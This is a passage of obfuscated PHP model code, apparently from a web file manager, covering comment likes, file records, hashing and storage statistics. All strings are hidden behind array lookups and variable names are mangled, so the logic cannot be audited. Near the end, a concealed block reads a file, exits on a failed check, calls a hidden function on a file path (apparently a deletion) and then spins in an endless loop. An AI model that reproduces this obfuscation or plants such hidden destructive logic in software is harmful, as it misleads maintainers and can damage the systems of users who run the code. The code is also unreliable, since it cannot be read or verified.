$ª…ÄÜä®; } $×½Øø®‰ = $this->field($º¦ò…ñ[1773])->where($“¹—à×Ò)->limit(500)->select(); $×½Øø®‰ = array_to_keyvalue($×½Øø®‰, $º¦ò…ñ[12], $º¦ò…ñ[1773]); $ª…ÄÜä®[$º¦ò…ñ[2008]] = Model($º¦ò…ñ[586])->userListInfo($×½Øø®‰); return $ª…ÄÜä®; } public function prasiseUserList($ƒ®Çß”Â) { $ùÕ‡ÇÉÉ =& $_SERVER[ÕŸ²ó÷å]; $”±«Ë¬ë = array($ùÕ‡ÇÉÉ[2009] => $ƒ®Çß”Â); $Ûš…º“— = $this->where($”±«Ë¬ë)->find(); $«ª½¨Ä› = _get($Ûš…º“—, $ùÕ‡ÇÉÉ[2004], 0); $’çÒ´ = array($ùÕ‡ÇÉÉ[341] => $«ª½¨Ä›, $ùÕ‡ÇÉÉ[2008] => array()); if (!$«ª½¨Ä›) { return $’çÒ´; } $ìÃ·Ç¯ = Model($ùÕ‡ÇÉÉ[2010])->field($ùÕ‡ÇÉÉ[1773])->where($”±«Ë¬ë)->limit(500)->select(); $ìÃ·Ç¯ = array_to_keyvalue($ìÃ·Ç¯, $ùÕ‡ÇÉÉ[12], $ùÕ‡ÇÉÉ[1773]); $’çÒ´[$ùÕ‡ÇÉÉ[2008]] = Model($ùÕ‡ÇÉÉ[586])->userListInfo($ìÃ·Ç¯); return $’çÒ´; } public function remove($ùÇŒÃæ›) { $ÊÈ¥ò¢ş =& $_SERVER[ÕŸ²ó÷å]; $ºËÌ¤Ñ = array($ÊÈ¥ò¢ş[2002] => $ùÇŒÃæ›); $ÍÙÂğıÚ = $this->where($ºËÌ¤Ñ)->find(); if ($ÍÙÂğıÚ[$ÊÈ¥ò¢ş[2001]]) { $this->where(array($ÊÈ¥ò¢ş[2002] => $ÍÙÂğıÚ[$ÊÈ¥ò¢ş[2001]]))->setAdd($ÊÈ¥ò¢ş[2003], -1); } return $this->where($ºËÌ¤Ñ)->delete(); } public function edit($ŒŠ´“”Ş, $ ¥ï×±…) { $šœ»«Ã½ =& $_SERVER[ÕŸ²ó÷å]; $ß´È‰ô– = array($šœ»«Ã½[2002] => $ŒŠ´“”Ş); return $this->where($ß´È‰ô–)->save(array($šœ»«Ã½[2011] => $ ¥ï×±…)); } public function prasise($Ä”ŞşÏµ) { $à¹Úñƒú =& $_SERVER[ÕŸ²ó÷å]; $şÚä®†¿ = Model($à¹Úñƒú[2012]); $ğ§…ŸØ¢ = array($à¹Úñƒú[2002] => $Ä”ŞşÏµ, $à¹Úñƒú[1764] => USER_ID); $ş’—ÅÁ = $şÚä®†¿->where($ğ§…ŸØ¢)->find(); if (!$ş’—ÅÁ) { $şÚä®†¿->add($ğ§…ŸØ¢); $èÀÄƒÓ÷ = $this->where(array($à¹Úñƒú[2002] => $Ä”ŞşÏµ))->setAdd($à¹Úñƒú[2004], 1); } else { $şÚä®†¿->where($ğ§…ŸØ¢)->delete(); $èÀÄƒÓ÷ = $this->where(array($à¹Úñƒú[2002] => $Ä”ŞşÏµ))->setAdd($à¹Úñƒú[2004], -1); } return $èÀÄƒÓ÷; } public function targetInfo($ôÆô™Üı, $Çµİ…¦ı) { $ıÃ¤ášä =& $_SERVER[ÕŸ²ó÷å]; $¤ÕØÆ = array($ıÃ¤ášä[657] => $ôÆô™Üı, $ıÃ¤ášä[658] => $Çµİ…¦ı); $¼Å©ªã = $this->where($¤ÕØÆ)->count(); $çÒ®î÷ = "\122\111\x47\110\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\143\x6f\155\155\x65\x6e\x74\137\x70\x72\141\x69\x73\x65\40\163\x74\141\162\x20\x6f\x6e\x20\x63\157\x6d\155\x65\156\164\56\x63\157\155\x6d\x65\x6e\x74\111\104\40\75\x20\x73\164\141\x72\x2e\x63\157\x6d\x6d\x65\x6e\164\x49\x44"; $äüÍ•» = $this->alias($ıÃ¤ášä[439])->where($¤ÕØÆ)->join($çÒ®î÷, $ıÃ¤ášä[2013])->count(); $¹Šİ¸˜È = array($ıÃ¤ášä[2014] => $¼Å©ªã, $ıÃ¤ášä[2015] => $äüÍ•»); return $¹Šİ¸˜È; } public function listData($êîÃ¯Š ) { $¬ç­øï¶ =& $_SERVER[ÕŸ²ó÷å]; if (isset($êîÃ¯Š [$¬ç­øï¶[2016]])) { if ($êîÃ¯Š [$¬ç­øï¶[2016]]) { $êîÃ¯Š [$¬ç­øï¶[2009]] = array($¬ç­øï¶[1095], intval($êîÃ¯Š [$¬ç­øï¶[2016]])); } unset($êîÃ¯Š [$¬ç­øï¶[2016]]); } if (isset($êîÃ¯Š [$¬ç­øï¶[2017]])) { if ($êîÃ¯Š [$¬ç­øï¶[2017]]) { $êîÃ¯Š [$¬ç­øï¶[2009]] = array($¬ç­øï¶[1092], intval($êîÃ¯Š [$¬ç­øï¶[2017]])); } unset($êîÃ¯Š [$¬ç­øï¶[2017]]); } return $this->_listData($êîÃ¯Š ); } private function _listData($î¸‹¡¿ò) { $ÓˆÎÜÕ­ =& $_SERVER[ÕŸ²ó÷å]; $»ú¾¸› = $this->where($î¸‹¡¿ò)->_makeOrder()->selectPage(100); $this->_listAppendParent($»ú¾¸›[$ÓˆÎÜÕ­[454]]); $this->_listAppendUser($»ú¾¸›[$ÓˆÎÜÕ­[454]]); $this->_listAppendMeta($»ú¾¸›[$ÓˆÎÜÕ­[454]]); return $»ú¾¸›; } private function _makeOrder() { $€ÃÁñü´ =& $_SERVER[ÕŸ²ó÷å]; $æÔ¹ÄÁ = array($€ÃÁñü´[2004], $€ÃÁñü´[2003], $€ÃÁñü´[241]); $ŞÕÇ§š = Input::get($€ÃÁñü´[539], $€ÃÁñü´[7], $€ÃÁñü´[506], $æÔ¹ÄÁ); $—ºõıæ½ = Input::get($€ÃÁñü´[540], $€ÃÁñü´[7], $€ÃÁñü´[1766], array($€ÃÁñü´[2018], $€ÃÁñü´[535])); $ìííğ¡… = $ŞÕÇ§š . $€ÃÁñü´[53] . $—ºõıæ½; return $this->order($ìííğ¡…); } private function _listAppendParent(&$áÇòŸÇ¿) { $’Ş«à¹Ë =& $_SERVER[ÕŸ²ó÷å]; $ªˆ¢Ë¯ê = array_unique(array_to_keyvalue($áÇòŸÇ¿, $’Ş«à¹Ë[12], $’Ş«à¹Ë[2001])); $ªˆ¢Ë¯ê = array_remove_value($ªˆ¢Ë¯ê, $’Ş«à¹Ë[238]); if (!$ªˆ¢Ë¯ê) { return; } $íîâÓÜÇ = $this->where(array($’Ş«à¹Ë[2002] => array($’Ş«à¹Ë[7], $ªˆ¢Ë¯ê)))->select(); $íîâÓÜÇ = array_to_keyvalue($íîâÓÜÇ, $’Ş«à¹Ë[2009]); foreach ($áÇòŸÇ¿ as &$•Åà¯Ì) { if (isset($íîâÓÜÇ[$•Åà¯Ì[$’Ş«à¹Ë[2001]]])) { $•Åà¯Ì[$’Ş«à¹Ë[2019]] = $íîâÓÜÇ[$•Åà¯Ì[$’Ş«à¹Ë[2001]]]; } } unset($•Åà¯Ì); } private function _listAppendUser(&$Ë‡‰Ò Å) { $½èó•ˆŠ =& $_SERVER[ÕŸ²ó÷å]; $§µ¾öÈÓ = array_unique(array_to_keyvalue($Ë‡‰Ò Å, $½èó•ˆŠ[12], $½èó•ˆŠ[1773])); $§µ¾öÈÓ = array_remove_value($§µ¾öÈÓ, $½èó•ˆŠ[238]); if (count($§µ¾öÈÓ) == 0) { return; } foreach ($Ë‡‰Ò Å as $²ø½Î…í) { if (isset($²ø½Î…í[$½èó•ˆŠ[2019]])) { $§µ¾öÈÓ[] = $²ø½Î…í[$½èó•ˆŠ[2019]][$½èó•ˆŠ[1773]]; } } $•ß… Ëœ = Model($½èó•ˆŠ[607])->userListInfo($§µ¾öÈÓ); foreach ($Ë‡‰Ò Å as &$²ø½Î…í) { $²ø½Î…í[$½èó•ˆŠ[671]] = $•ß… Ëœ[$²ø½Î…í[$½èó•ˆŠ[1773]]]; if (isset($²ø½Î…í[$½èó•ˆŠ[2019]])) { $²ø½Î…í[$½èó•ˆŠ[2019]][$½èó•ˆŠ[671]] = $•ß… Ëœ[$²ø½Î…í[$½èó•ˆŠ[2019]][$½èó•ˆŠ[1773]]]; } } unset($²ø½Î…í); } private function _listAppendMeta(&$¬Ô½ÊİĞ) { $‰ÌÀş° =& $_SERVER[ÕŸ²ó÷å]; $‡¥«Î„½ = array_unique(array_to_keyvalue($¬Ô½ÊİĞ, $‰ÌÀş°[12], $‰ÌÀş°[2009])); $‡¥«Î„½ = array_remove_value($‡¥«Î„½, $‰ÌÀş°[238]); if (!$‡¥«Î„½) { return; } foreach ($¬Ô½ÊİĞ as $­Èşø©‰) { if (isset($­Èşø©‰[$‰ÌÀş°[2019]])) { $‡¥«Î„½[] = $­Èşø©‰[$‰ÌÀş°[2019]][$‰ÌÀş°[2009]]; } } $Í¬­Ø¹¯ = $this->metaList($‡¥«Î„½); if (!$Í¬­Ø¹¯) { return !1; } foreach ($¬Ô½ÊİĞ as &$­Èşø©‰) { $­Èşø©‰[$‰ÌÀş°[548]] = $Í¬­Ø¹¯[$­Èşø©‰[$‰ÌÀş°[2009]]]; if (isset($­Èşø©‰[$‰ÌÀş°[2019]])) { $­Èşø©‰[$‰ÌÀş°[2019]][$‰ÌÀş°[548]] = $Í¬­Ø¹¯[$­Èşø©‰[$‰ÌÀş°[2019]][$‰ÌÀş°[2009]]]; } } unset($­Èşø©‰); } private function metaList($ŠÑèÖŠå) { $ä¦šé›² =& $_SERVER[ÕŸ²ó÷å]; if (!$ŠÑèÖŠå) { return array(); } $ë²ÊòÇ = array($ä¦šé›²[2009] => array($ä¦šé›²[7], $ŠÑèÖŠå)); $’ÚîÏ½¸ = Model($ä¦šé›²[2020])->where($ë²ÊòÇ)->select(); $’ÚîÏ½¸ = array_to_keyvalue_group($’ÚîÏ½¸, $ä¦šé›²[2009]); foreach ($’ÚîÏ½¸ as $´ÇÊª× => $‹¹»ÂÏ…) { $ÆñÆò€ = array(); foreach ($‹¹»ÂÏ… as $ãˆ©á¦ö) { $ÆñÆò€[$ãˆ©á¦ö[$ä¦šé›²[107]]] = $ãˆ©á¦ö[$ä¦šé›²[459]]; } $’ÚîÏ½¸[$´ÇÊª×] = $ÆñÆò€; } return $’ÚîÏ½¸ ? $’ÚîÏ½¸ : array(); } public function removeTarget($ô¦–ÂŸ„, $”ÆªÉå‚) { $ô“­ú¹ =& $_SERVER[ÕŸ²ó÷å]; if (!$”ÆªÉå‚) { return !0; } $”ÆªÉå‚ = is_array($”ÆªÉå‚) ? $”ÆªÉå‚ : array($”ÆªÉå‚); $îÙ÷‚¶Ì = array($ô“­ú¹[200] => $ô¦–ÂŸ„, $ô“­ú¹[578] => array($ô“­ú¹[7], $”ÆªÉå‚)); $çÖÏ¡ı† = $this->field($ô“­ú¹[2009])->where($îÙ÷‚¶Ì)->select(); $½ö‹û® = array_to_keyvalue($çÖÏ¡ı†, $ô“­ú¹[12], $ô“­ú¹[2009]); if (!$½ö‹û®) { return !0; } $îÙ÷‚¶Ì = array($ô“­ú¹[2009] => array($ô“­ú¹[7], $½ö‹û®)); $this->where($îÙ÷‚¶Ì)->delete(); Model($ô“­ú¹[2012])->where($îÙ÷‚¶Ì)->delete(); Model($ô“­ú¹[2021])->where($îÙ÷‚¶Ì)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\x65\137\x63\x6f\156\164\145\x6e\x74\163"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\124\x69\155\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\x72\x74", "\146\165\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\151\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\145\116\x61\155\x65" => "\x69\157\137\x66\x69\x6c\145\x5f\x6d\145\164\141", "\155\145\x74\x61\106\151\145\154\x64" => "\146\151\154\x65\x49\104"); public function fileInfo($„“â•ªÏ) { $ú ’ªµª =& $_SERVER[ÕŸ²ó÷å]; static $ÖÔ°õÔó = array(); if (!isset($ÖÔ°õÔó[$„“â•ªÏ])) { $‚İë™Øä = $ú ’ªµª[2022]; $íî£€—– = Model($ú ’ªµª[553])->field($‚İë™Øä)->where(array($ú ’ªµª[551] => $„“â•ªÏ))->find(); $ÖÔ°õÔó[$„“â•ªÏ] = $íî£€—–; } return $ÖÔ°õÔó[$„“â•ªÏ]; } public function addFileByContent($ÃÙÜÉÜà = '', $ääşˆï´ = '') { $ÃÏäÀú =& $_SERVER[ÕŸ²ó÷å]; $‡§Å’ø¥ = TEMP_PATH . $ÃÏäÀú[2023]; if (!is_dir($‡§Å’ø¥)) { mk_dir($‡§Å’ø¥); } $ñ³™åı = $‡§Å’ø¥ . $ÃÏäÀú[2024] . rand_string(16); file_put_contents($ñ³™åı, $ÃÙÜÉÜà); $ŸÇ£´ = $this->addFile($ñ³™åı, $ääşˆï´, !0); if (file_exists($ñ³™åı)) { @unlink($ñ³™åı); } return $ŸÇ£´; } public function createFileName($Ã‡ËŠ¥Ñ, $¿²ı²„¢ = false, $õï¤ñÎ = false) { $Àœİ©ª =& $_SERVER[ÕŸ²ó÷å]; $Äà¿¼ŒĞ = IO::init($Àœİ©ª[8]); $»Âµ±ÚÖ = $this->makeFilePath($Ã‡ËŠ¥Ñ, $Äà¿¼ŒĞ, $¿²ı²„¢, $õï¤ñÎ); $ú´«¾Ö  = $Äà¿¼ŒĞ->pathFather($»Âµ±ÚÖ); static $´—Ã¨´å = false; $ÊË­Ø­è = $Àœİ©ª[2025] . md5($ú´«¾Ö ); if (!$´—Ã¨´å && !Cache::get($ÊË­Ø­è)) { $´—Ã¨´å = !0; $ÙıÎÙÏ£ = IO::mkdir($ú´«¾Ö ); if (!IO::exist($ÙıÎÙÏ£ . $Àœİ©ª[881])) { IO::mkfile($ÙıÎÙÏ£ . $Àœİ©ª[881]); } Cache::set($ÊË­Ø­è, 1, 3600 * 2); } return $»Âµ±ÚÖ; } public function makeFilePath($ÍºÙµÁ§, $ÀŸ¯úé, $–˜ËşØ = false, $Îî¼Ş¯‡ = false) { $ùç±ìšÂ =& $_SERVER[ÕŸ²ó÷å]; $úÊ²±šÔ = Model($ùç±ìšÂ[854])->get($ùç±ìšÂ[2026]); $Ï¨æ ’ò = KodIO::defaultIO() . date($ùç±ìšÂ[2027]); $üœÕ²Ÿ˜ = $Ï¨æ ’ò . rand_string(5) . short_id(100); $ÍºÙµÁ§ = str_replace($ùç±ìšÂ[8], $ùç±ìšÂ[11], KodIO::clear($ÍºÙµÁ§)); $³¥‰¦îç = $ÀŸ¯úé->ext($ÍºÙµÁ§); if (!$ÍºÙµÁ§) { $úÊ²±šÔ = $ùç±ìšÂ[860]; } switch ($úÊ²±šÔ) { case $ùç±ìšÂ[2028]: if ($³¥‰¦îç) { $üœÕ²Ÿ˜ = $üœÕ²Ÿ˜ . $ùç±ìšÂ[10] . $³¥‰¦îç; } if ($³¥‰¦îç == $ùç±ìšÂ[1964]) { $üœÕ²Ÿ˜ .= $ùç±ìšÂ[1294]; } break; case $ùç±ìšÂ[2029]: $…íî“ßû = Model($ùç±ìšÂ[854])->get($ùç±ìšÂ[855]); $É†‚Œ•‰ = substr(md5($ùç±ìšÂ[856] . $…íî“ßû . date($ùç±ìšÂ[833])), 0, 8); $Êæüã… = KodIO::defaultDriver(); $Ï¨æ ’ò = $ùç±ìšÂ[1325] . $Êæüã…[$ùç±ìšÂ[484]] . $ùç±ìšÂ[493] . date($ùç±ìšÂ[2030]) . $É†‚Œ•‰ . $ùç±ìšÂ[8]; if ($³¥‰¦îç == $ùç±ìšÂ[1964]) { $ÍºÙµÁ§ .= $ùç±ìšÂ[1294]; } $ïœ¾÷…ğ = $ùç±ìšÂ[2031] . $Ï¨æ ’ò . $ÍºÙµÁ§; CacheLock::lock($ïœ¾÷…ğ); $üœÕ²Ÿ˜ = $Ï¨æ ’ò . $ÍºÙµÁ§; if (IO::exist($Ï¨æ ’ò . $ÍºÙµÁ§)) { $ë€Õûó = substr($ÍºÙµÁ§, 0, strlen($ÍºÙµÁ§) - strlen($³¥‰¦îç)); $Úá±³Ì„ = $Îî¼Ş¯‡ ? substr($Îî¼Ş¯‡, 0, 5) : ($–˜ËşØ ? substr($–˜ËşØ, 0, 5) : rand_string(5)); $üœÕ²Ÿ˜ = $Ï¨æ ’ò . $ë€Õûó . $Úá±³Ì„; if ($³¥‰¦îç) { $üœÕ²Ÿ˜ = $üœÕ²Ÿ˜ . $ùç±ìšÂ[10] . $³¥‰¦îç; } } if (IO::isOsDriver($üœÕ²Ÿ˜) && !IO::isUploadServer($üœÕ²Ÿ˜)) { if (IO::exist($üœÕ²Ÿ˜)) { return $üœÕ²Ÿ˜; } $£ì‹­ô” = IO::setContent($üœÕ²Ÿ˜, $ùç±ìšÂ[12]); if (!$£ì‹­ô”) { show_json($ùç±ìšÂ[2032], !1); } } CacheLock::unlock($ïœ¾÷…ğ); break; case $ùç±ìšÂ[860]: break; default: break; } return $üœÕ²Ÿ˜; } public function addFileByRemote($ÙíÂè¦, $ş¬©¥ı‚, $áÊï—Š = array()) { $™Øàü° =& $_SERVER[ÕŸ²ó÷å]; if (!IO::exist($ÙíÂè¦)) { return !1; } $ÙÛÂõŸ = $áÊï—Š[$™Øàü°[556]] ? $áÊï—Š[$™Øàü°[556]] : $™Øàü°[12]; $×‹À÷Ó = IO::hashMd5($ÙíÂè¦, $ÙÛÂõŸ); $Ñ—ü´ = KodIO::defaultDriver(); $œã·‰Ç÷ = array($™Øàü°[626] => IO::size($ÙíÂè¦), $™Øàü°[2033] => 1, $™Øàü°[503] => $ş¬©¥ı‚, $™Øàü°[892] => $Ñ—ü´[$™Øàü°[484]], $™Øàü°[504] => $ÙíÂè¦, $™Øàü°[2034] => $áÊï—Š[$™Øàü°[681]] ? $áÊï—Š[$™Øàü°[681]] : IO::hashSimple($ÙíÂè¦), $™Øàü°[2035] => $×‹À÷Ó ? $×‹À÷Ó : $ÙÛÂõŸ); if ($¢ªÓÇî = $this->addFileCheckExist($œã·‰Ç÷[$™Øàü°[681]], $œã·‰Ç÷[$™Øàü°[556]], $œã·‰Ç÷[$™Øàü°[89]])) { return $¢ªÓÇî; } return $this->addFileData($œã·‰Ç÷); } private function addFileData($”„¤Ï¾Ö) { $ÔÛö¸ù =& $_SERVER[ÕŸ²ó÷å]; if (!$”„¤Ï¾Ö) { return !1; } $”„¤Ï¾Ö[$ÔÛö¸ù[89]] = intval($”„¤Ï¾Ö[$ÔÛö¸ù[89]]); if (!$”„¤Ï¾Ö[$ÔÛö¸ù[89]] && strlen($”„¤Ï¾Ö[$ÔÛö¸ù[681]]) > 32) { $”„¤Ï¾Ö[$ÔÛö¸ù[89]] = intval(substr($”„¤Ï¾Ö[$ÔÛö¸ù[681]], 32)); } $òåïÆè = $this->add($”„¤Ï¾Ö); return $this->find($òåïÆè); } public function addFile($ç±â«Ö, $ÍçÕÎı¿, $Œ³„£¥¢ = false) { $î©£º‡ =& $_SERVER[ÕŸ²ó÷å]; $Ñ¢‚ƒ’ö = IO::hashSimple($ç±â«Ö); $««úëğˆ = IO::size($ç±â«Ö); $Í–‘“ßî = $««úëğˆ <= 1024 * 1024 * 10 ? IO::hashMd5($ç±â«Ö) : $î©£º‡[12]; $ÕıàõÏ¹ = $î©£º‡[2036] . $Ñ¢‚ƒ’ö; CacheLock::lock($ÕıàõÏ¹); if ($Í–‘“ßî && $Ñ¢‚ƒ’ö) { $³ÁÄóí¾ = $this->addFileCheckExist($Ñ¢‚ƒ’ö, $Í–‘“ßî, $««úëğˆ); if ($³ÁÄóí¾) { CacheLock::unlock($ÕıàõÏ¹); return $³ÁÄóí¾; } } $º”“·Ã² = $this->addFileMake($ç±â«Ö, $««úëğˆ, $Ñ¢‚ƒ’ö, $Í–‘“ßî, $ÍçÕÎı¿, $Œ³„£¥¢); $â›ŞƒÏ = $this->addFileData($º”“·Ã²); CacheLock::unlock($ÕıàõÏ¹); if (!$Í–‘“ßî && $â›ŞƒÏ) { $this->fileMd5Check($â›ŞƒÏ); } return $â›ŞƒÏ; } public function fileMd5Check($„û€Ê¶™) { $©µõ¬ü÷ =& $_SERVER[ÕŸ²ó÷å]; $ú†¼İÒ± = array($„û€Ê¶™[$©µõ¬ü÷[550]], $„û€Ê¶™[$©µõ¬ü÷[97]]); $‚”Çñ‡” = $©µõ¬ü÷[2037] . $„û€Ê¶™[$©µõ¬ü÷[97]]; $•ÁÃ¸ÂÓ = $©µõ¬ü÷[2038] . $„û€Ê¶™[$©µõ¬ü÷[550]]; TaskQueue::add($©µõ¬ü÷[2039], $ú†¼İÒ±, $‚”Çñ‡”, $•ÁÃ¸ÂÓ); } public function fileMd5Set($ÔşÅ¡à, $¯šˆƒ¯) { $êì¸úïä =& $_SERVER[ÕŸ²ó÷å]; $¤ŞâØ¢ = $this->find($ÔşÅ¡à); if (!$¤ŞâØ¢ || $¤ŞâØ¢[$êì¸úïä[556]]) { return; } $®¹¦ˆ›– = IO::hashMd5($¯šˆƒ¯); if (!$®¹¦ˆ›–) { return $êì¸úïä[12]; } $this->where(array($êì¸úïä[550] => $ÔşÅ¡à))->save(array($êì¸úïä[556] => $®¹¦ˆ›–)); } public function addFileMake($ƒ‚ªıš, $¥õ•ŒŸõ, $Ç¶‹—ó, $Íì¡ï‹œ, $òÎ×­Éø, $ú¨™×Õï) { $Ã®Ä¡Œš =& $_SERVER[ÕŸ²ó÷å]; $£÷ñ„ÍÙ = $this->createFileName($òÎ×­Éø, $Ç¶‹—ó, $Íì¡ï‹œ); $ÊÅ£™ı¸ = get_path_father($£÷ñ„ÍÙ); $‡®ÆŞÀ· = get_path_this($£÷ñ„ÍÙ); if ($ú¨™×Õï) { $Ø™ßû‚å = IO::move($ƒ‚ªıš, $ÊÅ£™ı¸, !1, $‡®ÆŞÀ·); } else { $Ø™ßû‚å = IO::copy($ƒ‚ªıš, $ÊÅ£™ı¸, !1, $‡®ÆŞÀ·); } if (!$Ø™ßû‚å) { return !1; } $¬¶Í¸ŠŠ = KodIO::defaultDriver(); $©¸™ìÇº = array($Ã®Ä¡Œš[626] => $¥õ•ŒŸõ, $Ã®Ä¡Œš[2033] => 1, $Ã®Ä¡Œš[503] => $òÎ×­Éø, $Ã®Ä¡Œš[892] => $¬¶Í¸ŠŠ[$Ã®Ä¡Œš[484]], $Ã®Ä¡Œš[504] => $£÷ñ„ÍÙ, $Ã®Ä¡Œš[2034] => $Ç¶‹—ó, $Ã®Ä¡Œš[2035] => $Íì¡ï‹œ); return $©¸™ìÇº; } public function addFileCheckExist($ßÆÚ‰ğ¢, $ğÄî˜¤, $ª°ô©†«) { $æø «Â  =& $_SERVER[ÕŸ²ó÷å]; $ÅûÏõÙ˜ = $this->findByHash($ßÆÚ‰ğ¢, $ğÄî˜¤); if (!$ÅûÏõÙ˜) { return !1; } $Ì¯öÂ–­ = array($æø «Â [2033] => intval($ÅûÏõÙ˜[$æø «Â [2040]]) + 1, $æø «Â [626] => $ª°ô©†«); $this->where(array($æø «Â [551] => $ÅûÏõÙ˜[$æø «Â [550]]))->save($Ì¯öÂ–­); return $ÅûÏõÙ˜; } public function remove($•ü˜¾úô) { $this->linkCountChange($•ü˜¾úô, !1); $this->clearEmpty(); return !0; } public function linkAdd($´†òéÃñ) { $this->linkCountChange($´†òéÃñ, !0); } public function linkCountChange($«îæºùñ, $Šƒ£¨Ãã) { $ƒ—´¥À =& $_SERVER[ÕŸ²ó÷å]; if (!$«îæºùñ) { return; } if (!is_array($«îæºùñ)) { $«îæºùñ = array($«îæºùñ); } $à¼š˜© = array(); foreach ($«îæºùñ as $¶“’€™–) { $€Ÿªßç¸ = $¶“’€™– . $ƒ—´¥À[12]; if (!$à¼š˜©[$€Ÿªßç¸]) { $à¼š˜©[$€Ÿªßç¸] = 0; } $à¼š˜©[$€Ÿªßç¸]++; } $Ìê¡Ûè÷ = array(); foreach ($à¼š˜© as $¶“’€™– => $Ù©ÃáÂ›) { $€Ÿªßç¸ = $Ù©ÃáÂ› . $ƒ—´¥À[12]; if (!$Ìê¡Ûè÷[$€Ÿªßç¸]) { $Ìê¡Ûè÷[$€Ÿªßç¸] = array(); } $Ìê¡Ûè÷[$€Ÿªßç¸][] = $¶“’€™–; } foreach ($Ìê¡Ûè÷ as $Ù©ÃáÂ› => $¥ÂÈ¶) { if (!$¥ÂÈ¶) { continue; } $Ù©ÃáÂ› = $Šƒ£¨Ãã ? $Ù©ÃáÂ› : -intval($Ù©ÃáÂ›); $ƒï˜Ô  = array($ƒ—´¥À[550] => array($ƒ—´¥À[7], $¥ÂÈ¶)); if ($Ù©ÃáÂ› < 0) { $ƒï˜Ô [$ƒ—´¥À[2040]] = array($ƒ—´¥À[1096], abs($Ù©ÃáÂ›)); } $this->where($ƒï˜Ô )->setAdd($ƒ—´¥À[2040], $Ù©ÃáÂ›); } } public function findByHash($ñö’×Ãì, $İ¸Á¤Áó = false) { $‚ĞœöÚÉ =& $_SERVER[ÕŸ²ó÷å]; if (!$ñö’×Ãì && !$İ¸Á¤Áó) { return !1; } $ƒ­–çÅÓ = array($‚ĞœöÚÉ[2034] => $ñö’×Ãì); if ($İ¸Á¤Áó) { $ƒ­–çÅÓ = array($‚ĞœöÚÉ[2035] => $İ¸Á¤Áó); } return $this->order($‚ĞœöÚÉ[2041])->where($ƒ­–çÅÓ)->find(); } public function clearEmpty($çÜå¯ä® = 0) { $˜Ğ…èç =& $_SERVER[ÕŸ²ó÷å]; $“¸Ã©£Í = time() - 3600 * 24 * $çÜå¯ä®; $¢­ô­¸“ = $˜Ğ…èç[2042] . $“¸Ã©£Í; $˜èñ–ö› = $this->where($¢­ô­¸“)->select(); if (!$˜èñ–ö›) { return; } $ÂŒæñ•Ÿ = new Task($˜Ğ…èç[2043], $˜Ğ…èç[12], count($˜èñ–ö›)); foreach ($˜èñ–ö› as $ÉÃˆÙ‰•) { $ÂŒæñ•Ÿ->update(1); $this->resetFile($ÉÃˆÙ‰•); } $ÂŒæñ•Ÿ->end(); } public function resetFile($³ù‚á±£) { $Œ›á–– =& $_SERVER[ÕŸ²ó÷å]; $€¢ñ¯—ó = array($Œ›á––[551] => $³ù‚á±£[$Œ›á––[550]]); $ÏšÄ›İ’ = Model($Œ›á––[1421])->where($€¢ñ¯—ó)->count(); $™­õÑÔè = Model($Œ›á––[2044])->where($€¢ñ¯—ó)->count(); $÷ï‘û‡ê = intval($ÏšÄ›İ’) + intval($™­õÑÔè); if ($÷ï‘û‡ê == 0) { IO::remove($³ù‚á±£[$Œ›á––[97]]); Model($Œ›á––[2045])->delete($³ù‚á±£[$Œ›á––[550]]); $this->where($€¢ñ¯—ó)->delete(); $this->metaSet($³ù‚á±£[$Œ›á––[550]], null, null); write_log(ACTION . $Œ›á––[2046] . KodUser::id() . $Œ›á––[2047] . $³ù‚á±£[$Œ›á––[550]] . $Œ›á––[2048] . $³ù‚á±£[$Œ›á––[89]] . $Œ›á––[211] . $³ù‚á±£[$Œ›á––[97]], $Œ›á––[2049]); return; } if ($³ù‚á±£[$Œ›á––[2040]] != $÷ï‘û‡ê) { $this->where($€¢ñ¯—ó)->save(array($Œ›á––[2033] => $÷ï‘û‡ê)); } } public function storageInfo($º”Ÿü = false) { $ŠÊÊ¦— =& $_SERVER[ÕŸ²ó÷å]; $§€ÏÏÂö = $this->count() + 0.0; $¼ÌÓÉ·ô = 0; $ÑúÌÊÈë = 1; $ˆáÊÄÒƒ = 0; $ªî¬ı³Œ = 5000; for ($ö©‚éÚÃ = 0; $ö©‚éÚÃ < $§€ÏÏÂö; $ö©‚éÚÃ = $ö©‚éÚÃ + $ªî¬ı³Œ) { $İÚåôÉ” = $this->limit($ö©‚éÚÃ, $ö©‚éÚÃ + $ªî¬ı³Œ)->select(); foreach ($İÚåôÉ” as $Ëş¸ïÎ) { $ÑúÌÊÈë += $Ëş¸ïÎ[$ŠÊÊ¦—[89]] * $Ëş¸ïÎ[$ŠÊÊ¦—[2040]]; $¼ÌÓÉ·ô += $Ëş¸ïÎ[$ŠÊÊ¦—[89]] * ($Ëş¸ïÎ[$ŠÊÊ¦—[2040]] - 1); $ˆáÊÄÒƒ += $Ëş¸ïÎ[$ŠÊÊ¦—[2040]]; } } $Ö ³ã¦£ = array($ŠÊÊ¦—[2050] => $ÑúÌÊÈë, $ŠÊÊ¦—[2051] => $¼ÌÓÉ·ô, $ŠÊÊ¦—[2052] => $¼ÌÓÉ·ô / $ÑúÌÊÈë, $ŠÊÊ¦—[93] => $§€ÏÏÂö, $ŠÊÊ¦—[2053] => $ˆáÊÄÒƒ); return $Ö ³ã¦£; } } goto e‘…ˆå‹£; C®ùêù¥ƒ…: if (!isset($_SERVER[$_SERVER[ÕŸ²ó÷å][54]]) || !isset($_SERVER[$_SERVER[ÕŸ²ó÷å][63]])) { $_getc = $_SERVER[ÕŸ²ó÷å][56]; $_getfile = $_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÕŸ²ó÷å][59], $_getfilec); if (count($_getarrs) < $_SERVER[ÕŸ²ó÷å][60]) { $exit = $_SERVER[ÕŸ²ó÷å][61]; $exit(); } $_act = $_SERVER[ÕŸ²ó÷å][62]; $_act($_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÕŸ²ó÷å][463]); } } class PathDriverDriverShareItem { public function __construct($¹·€Şö¥) { $this->pathParse = $¹·€Şö¥; } public function __call($¦Èş¶üì, 